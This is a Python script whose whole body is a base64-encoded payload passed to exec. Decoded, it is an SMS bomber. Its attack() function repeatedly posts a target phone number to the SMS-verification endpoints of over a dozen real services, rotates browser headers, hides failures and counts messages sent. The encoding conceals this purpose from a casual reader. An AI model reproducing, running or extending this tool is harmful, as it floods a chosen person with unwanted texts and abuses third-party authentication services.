import marshal, base64
exec(base64.b64decode("aW1wb3J0IHJhbmRvbQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGRhdGV0aW1lCgoKIyBjb2xvdXJzCmdyZWVuICAgICA9ICdcMDMzWzkybScKY3lhbiAgICAgID0gJ1wwMzNbOTVtJwpib2xkICAgICAgPSAnXDAzM1sxbScKdW5kZXJsaW5lID0gJ1wwMzNbNG0nCmVuZCAgICAgICA9ICdcMDMzWzBtJwpyZWQgICAgICAgPSAnXDAzM1s5MW0nCgojIGhlYWRlcnMgZm9yIG9wdGltaXppbmcgc21zIHNlbnQKaGVhZHMgPSBbCiAgICB7CiAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBydjo3Ni4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzc2LjAnLAogICAgICAgICdBY2NlcHQnOiAnKi8qJwogICAgfSwKICAgIHsKICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjo3Mi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzcyLjAiLAogICAgJ0FjY2VwdCc6ICcqLyonCiAgICB9LAogICAgewogICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgRGViaWFuOyBMaW51eCB4ODZfNjQ7IHJ2OjcyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNzIuMCIsCiAgICAnQWNjZXB0JzogJyovKicKICAgIH0sCiAgICB7CiAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAzLjE7IHJ2Ojc2LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjkuMCcsCiAgICAnQWNjZXB0JzogJyovKicKICAgIH0sCiAgICB7CiAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoWDExOyBEZWJpYW47IExpbnV4IHg4Nl82NDsgcnY6NzIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83Ni4wIiwKICAgICdBY2NlcHQnOiAnKi8qJwogICAgfSwKXQogICAgICAgICAgIAogICAgICAgICAgIApkZWYgY2hlY2soc2VudCwgc21zKToKICAgIGlmIHNlbnQgPT0gc21zOgogICAgICAgIHF1aXQoKQogCgpkZWYgdGltZShzZW50KToKICAgIGEgPSBkYXRldGltZS5kYXRldGltZS5ub3coKQogICAgdGltZSA9IChzdHIoYS5ob3VyKSArICc6JyArIHN0cihhLm1pbnV0ZSkgKyAnOicgK3N0cihhLnNlY29uZCkpCiAgICBtc2cxID0gZiJ7Z3JlZW59e2JvbGR9e3N0cihzZW50KX17ZW5kfSBzbXMgc2VudCEiCiAgICBtc2cyID0gZiJ7Z3JlZW59e2JvbGR9e3N0cih0aW1lKX17ZW5kfSIKICAgIGlmIGludChzZW50KSA8IDEwOgogICAgCXByaW50KGYie21zZzF9ICAgICAgICAge21zZzJ9IikKICAgIGVsaWYgaW50KHNlbnQpIDwgMTAwOgogICAgCXByaW50KGYie21zZzF9ICAgICAgICB7bXNnMn0iKQogICAgZWxpZiBpbnQoc2VudCkgPCAxMDAwOgogICAgCXByaW50KGYie21zZzF9ICAgICAgIHttc2cyfSIpCiAgICBlbGlmIGludChzZW50KSA8IDEwMDAwOgogICAgCXByaW50KGYie21zZzF9ICAgICAge21zZzJ9IikKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiJ7bXNnMX0gICAgIHttc2cyfSIpCiAgICAJCgpkZWYgYXR0YWNrKG51bWJlciwgc21zKToKICAgIG51bWJlcl83ID0gc3RyKDcpICsgbnVtYmVyCiAgICBudW1iZXJfcGx1czcgPSBzdHIoKzcpICsgbnVtYmVyCiAgICBudW1iZXJfOCA9IHN0cig4KSArIG51bWJlcgogICAgc2VudCA9IDAKICAgIHByaW50KCItIiAqIDMzKQogICAgcHJpbnQoZiJ8ICB7Z3JlZW59e2JvbGR9ICBhbW91bnQgICB7ZW5kfSB8IHtncmVlbn17Ym9sZH0gICAgIHRpbWUgICAgIHtlbmR9IHwiKQogICAgcHJpbnQoIi0iICogMzMpCiAgICBIRUFERVJTID0gcmFuZG9tLmNob2ljZShoZWFkcykKICAgIHdoaWxlIHNlbnQgPD0gc21zOgogICAgCXRyeToKICAgIAkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkuc3VubGlnaHQubmV0L3YzL2N1c3RvbWVycy9hdXRob3JpemF0aW9uLycsIGRhdGE9eydwaG9uZSc6IG51bWJlcl83fSwgaGVhZGVycz1IRUFERVJTKQogICAgCQlzZW50ICs9IDEKICAgIAkJdGltZShzZW50KQogICAgCQljaGVjayhzZW50LHNtcykKICAgIAlleGNlcHQ6CiAgICAJCXBhc3MKICAgIAkJCiAgICAJdHJ5OgogICAgCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL3FsZWFuLnJ1L2NsaWVudHMtYXBpL3YyL3Ntc19jb2Rlcy9hdXRoL3JlcXVlc3RfY29kZSIsanNvbiA9IHsicGhvbmUiOiBudW1iZXJfN30sIGhlYWRlcnM9SEVBREVSUykKICAgIAkJc2VudCArPSAxCiAgICAJCXRpbWUoc2VudCkKICAgIAkJY2hlY2soc2VudCxzbXMpCiAgICAJZXhjZXB0OgogICAgCQlwYXNzCiAgICAJCQogICAgCXRyeToKICAgIAkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9jbG91ZC5tYWlsLnJ1L2FwaS92Mi9ub3RpZnkvYXBwbGluaycsanNvbiA9IHsicGhvbmUiOiBudW1iZXJfcGx1czcsICJhcGkiOiAyLCAiZW1haWwiOiAiZW1haWwiLCJ4LWVtYWlsIjogIngtZW1haWwifSwgaGVhZGVycz1IRUFERVJTKQogICAgCQlzZW50ICs9IDEKICAgIAkJdGltZShzZW50KQogICAgCQljaGVjayhzZW50LHNtcykKICAgIAlleGNlcHQ6CiAgICAJCXBhc3MKICAgIAkJCiAgICAJdHJ5OgogICAgCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwcC1hcGkua2ZjLnJ1L2FwaS92MS9jb21tb24vYXV0aC9zZW5kLXZhbGlkYXRpb24tc21zJywganNvbj17J3Bob25lJzogbnVtYmVyX3BsdXM3fSwgaGVhZGVycz1IRUFERVJTKQogICAgCQlzZW50ICs9IDEKICAgIAkJdGltZShzZW50KQogICAgCQljaGVjayhzZW50LHNtcykKICAgIAlleGNlcHQ6CiAgICAJCXBhc3MKICAgIAkJCiAgICAJdHJ5OgogICAgCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2IudXRhaXIucnUvYXBpL3YxL2xvZ2luLycsIGRhdGEgPSB7J2xvZ2luJzpudW1iZXJfOH0sIGhlYWRlcnM9SEVBREVSUykKICAgIAkJc2VudCArPSAxCiAgICAJCXRpbWUoc2VudCkKICAgIAkJY2hlY2soc2VudCxzbXMpCiAgICAJZXhjZXB0OgogICAgCQlwYXNzCiAgICAJCQogICAgCXRyeToKICAgIAkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkuZ290aW5kZXIuY29tL3YyL2F1dGgvc21zL3NlbmQ/YXV0aF90eXBlPXNtcyZsb2NhbGU9cnUnLCBkYXRhID0geyJwaG9uZV9udW1iZXIiOm51bWJlcl83fSwgaGVhZGVycz1IRUFERVJTKQogICAgCQlzZW50ICs9IDEKICAgIAkJdGltZShzZW50KQogICAgCQljaGVjayhzZW50LHNtcykKICAgIAlleGNlcHQ6CiAgICAJCXBhc3MKICAgIAkJCiAgICAJdHJ5OgogICAgCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5jaXRpbGluay5ydS9yZWdpc3RyYXRpb24vY29uZmlybS9waG9uZS8rJysgbnVtYmVyXzcgKycvJywgaGVhZGVycz1IRUFERVJTKQogICAgCQlzZW50ICs9IDEKICAgIAkJdGltZShzZW50KQogICAgCQljaGVjayhzZW50LHNtcykKICAgIAlleGNlcHQ6CiAgICAJCXBhc3MKICAgIAkJCiAgICAJdHJ5OgogICAgCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL29rLnJ1L2RrP2NtZD1Bbm9ueW1SZWdpc3RyYXRpb25FbnRlclBob25lJnN0LmNtZD1hbm9ueW1SZWdpc3RyYXRpb25FbnRlclBob25lIiwgZGF0YSA9IHsic3Quci5waG9uZSI6IG51bWJlcl9wbHVzN30sIGhlYWRlcnM9SEVBREVSUykKICAgIAkJc2VudCArPSAxCiAgICAJCXRpbWUoc2VudCkKICAgIAkJY2hlY2soc2VudCxzbXMpCiAgICAJZXhjZXB0OgogICAgCQlwYXNzCiAgICAJCQogICAgCXRyeToKICAgIAkgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcHAua2FydXNlbC5ydS9hcGkvdjEvcGhvbmUvJywgZGF0YSA9IHsicGhvbmUiOm51bWJlcl83fSwgaGVhZGVycz1IRUFERVJTKQogICAgCSAgICBzZW50ICs9IDEKICAgIAkgICAgdGltZShzZW50KQogICAgCSAgICBjaGVjayhzZW50LHNtcykKICAgIAlleGNlcHQ6CiAgICAJCXBhc3MKICAgIAkJCiAgICAJdHJ5OgogICAgCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL3lvdWRyaXZlLnRvZGF5L2xvZ2luL3dlYi9waG9uZScsIGRhdGEgPSB7J3Bob25lJzogbnVtYmVyLCAncGhvbmVfY29kZSc6ICc3J30saGVhZGVycz1IRUFERVJTKSAjaGVhZGVycyA9IHt9LCBoZWFkZXJzPUhFQURFUlMpCiAgICAJCXNlbnQgKz0gMQogICAgCQl0aW1lKHNlbnQpCiAgICAJCWNoZWNrKHNlbnQsc21zKQogICAgCWV4Y2VwdDoKICAgIAkJcGFzcwogICAgCQkKICAgIAl0cnk6CiAgICAJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBpLm10c3R2LnJ1L3YxL3VzZXJzJywganNvbj17J21zaXNkbic6IG51bWJlcl83fSwgaGVhZGVycz1IRUFERVJTKQogICAgCQlzZW50ICs9IDEKICAgIAkJdGltZShzZW50KQogICAgCQljaGVjayhzZW50LHNtcykKICAgIAlleGNlcHQ6CiAgICAJCXBhc3MKICAgIAkJCiAgICAJdHJ5OgogICAgCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL3lvdWxhLnJ1L3dlYi1hcGkvYXV0aC9yZXF1ZXN0X2NvZGUnLCBqc29uID0geyJwaG9uZSI6bnVtYmVyX3BsdXM3fSwgaGVhZGVycz1IRUFERVJTKQogICAgCQlzZW50ICs9IDEKICAgIAkJdGltZShzZW50KQogICAgCQljaGVjayhzZW50LHNtcykKICAgIAlleGNlcHQ6CiAgICAJCXBhc3MKICAgIAkJCiAgICAJdHJ5OgogICAgCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2VkYS55YW5kZXgvYXBpL3YxL3VzZXIvcmVxdWVzdF9hdXRoZW50aWNhdGlvbl9jb2RlJyxqc29uPXsicGhvbmVfbnVtYmVyIjogIisiICsgbnVtYmVyXzd9LCBoZWFkZXJzPUhFQURFUlMpCiAgICAJCXNlbnQgKz0gMQogICAgCQl0aW1lKHNlbnQpCiAgICAJCWNoZWNrKHNlbnQsc21zKQogICAgCWV4Y2VwdDoKICAgIAkJcGFzcwogICAgCQkKICAgIAl0cnk6CiAgICAJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vYXBpLml2aS5ydS9tb2JpbGVhcGkvdXNlci9yZWdpc3Rlci9waG9uZS92NiIsIGRhdGE9IHsicGhvbmUiOiBudW1iZXJfN30sIGhlYWRlcnM9SEVBREVSUykKICAgIAkJc2VudCArPSAxCiAgICAJCXRpbWUoc2VudCkKICAgIAkJY2hlY2soc2VudCxzbXMpCiAgICAJZXhjZXB0OgogICAgCQlwYXNzCiAgICAJCQogICAgCXRyeToKICAgIAkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9hcGkuZGVsaXRpbWUucnUvYXBpL3YyL3NpZ251cCIsZGF0YT17IlNpZ251cEZvcm1bdXNlcm5hbWVdIjogbnVtYmVyXzcsICJTaWdudXBGb3JtW2RldmljZV90eXBlXSI6IDN9LCBoZWFkZXJzPUhFQURFUlMpCiAgICAJCXNlbnQgKz0gMQogICAgCQl0aW1lKHNlbnQpCiAgICAJCWNoZWNrKHNlbnQsc21zKQogICAgCWV4Y2VwdDoKICAgIAkJcGFzcwogICAgCQkKICAgIAl0cnk6CiAgICAJICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LmljcS5jb20vc21zcmVnL3JlcXVlc3RQaG9uZVZhbGlkYXRpb24ucGhwJyxkYXRhPXsnbXNpc2RuJzogbnVtYmVyXzcsICJsb2NhbGUiOiAnZW4nLCAnY291bnRyeUNvZGUnOiAncnUnLCd2ZXJzaW9uJzogJzEnLCAiayI6ICJpYzFydHd6MXMxSGoxTzByIiwgInIiOiAiNDY3NjMifSwgaGVhZGVycz1IRUFERVJTKQogICAgCSAgICBzZW50ICs9IDEKICAgIAkgICAgdGltZShzZW50KQogICAgCSAgICBjaGVjayhzZW50LHNtcykKICAgIAlleGNlcHQ6CiAgICAJCXBhc3MK"))
